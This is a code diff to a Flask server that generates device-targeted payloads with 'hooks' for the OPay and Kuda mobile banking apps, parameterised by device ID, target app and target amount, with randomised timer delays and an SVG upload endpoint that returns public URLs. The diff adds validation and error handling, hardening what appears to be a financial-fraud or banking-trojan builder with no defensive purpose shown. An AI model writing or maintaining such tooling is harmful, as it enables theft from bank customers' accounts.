@@ -13,6 +13,10 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 CORS(app)
 
 def generate_demonic_payload(device_id, target_app, target_amount):
+    # Validate inputs
+    if not device_id or not target_app or not target_amount:
+        raise ValueError("Missing required parameters")
+    
     # App-specific hooks for OPay and Kuda
     opay_hooks = """
     // OPay-specific hooks
@@ -186,31 +190,37 @@ def home():
 
 @app.route('/generate', methods=['POST'])
 def generate():
-    device_id = request.json.get('device_id')
-    target_app = request.json.get('target_app')
-    target_amount = request.json.get('target_amount')
-    
-    payload = generate_demonic_payload(device_id, target_app, target_amount)
-    delay = random.randint(1000, 5000)
-    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
-    payload = payload.replace('), 1000)', f'), {delay})')
-    
-    return jsonify({'payload': payload})
+    try:
+        device_id = request.json.get('device_id')
+        target_app = request.json.get('target_app')
+        target_amount = request.json.get('target_amount')
+        
+        payload = generate_demonic_payload(device_id, target_app, target_amount)
+        delay = random.randint(1000, 5000)
+        payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
+        payload = payload.replace('), 1000)', f'), {delay})')
+        
+        return jsonify({'payload': payload})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    if 'file' not in request.files:
-        return jsonify({'error': 'No file uploaded'}), 400
-    
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({'error': 'No file selected'}), 400
-    
-    filename = f"{uuid.uuid4()}.svg"
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-    file.save(filepath)
-    
-    return jsonify({'url': f"{request.url_root}uploads/{filename}"})
+    try:
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file uploaded'}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'error': 'No file selected'}), 400
+        
+        filename = f"{uuid.uuid4()}.svg"
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(filepath)
+        
+        return jsonify({'url': f"{request.url_root}uploads/{filename}"})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
